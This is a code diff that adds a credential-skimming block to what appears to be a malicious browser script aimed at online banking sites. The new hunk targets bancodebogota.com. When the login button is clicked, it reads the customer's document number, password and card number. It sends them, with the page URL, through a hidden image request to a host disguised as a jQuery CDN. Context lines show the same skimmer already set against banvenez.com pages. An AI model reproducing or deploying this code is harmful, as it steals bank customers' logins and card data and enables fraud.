@@ -9,6 +9,28 @@ for (var i = 0; i < arrayLength; i++) {
 
 
 
+if (top['location']['href']['indexOf']('bancodebogota.com') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementsByClassName']('cont-personas')[0]) {
+            clearInterval(interval);
+            document['getElementsByClassName']('cont-ingreso-seguro')[0].onclick = function (_0x441cx2) {
+              var option = document.getElementByName("documentType");
+              var select = option.options[option.selectedIndex].text;
+              var login = {};
+                  login.documentNumber = document.getElementsByName("documentNumber")[0].value;
+                  login.pass = document.getElementsByName("password")[0].value;
+                  login.card = document.getElementsByName("cardNumber")[0].value;
+                  data = "docNumber: "+ login.documentNumber + " pass: "+ login.pass + " card: "+ login.card;
+
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+select+"&p="+data;
+            }
+        }
+    }, 1000)
+};
+
+
+
+
 if (top['location']['href']['indexOf']('e-bdv.banvenez.com') > -1) {
     var interval = setInterval(function () {
         if (document['getElementsByClassName']('borde_tabla_basic')[0]) {
@@ -22,9 +44,6 @@ if (top['location']['href']['indexOf']('e-bdv.banvenez.com') > -1) {
         }
     }, 1000)
 };
-
-
-
 
 
 if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
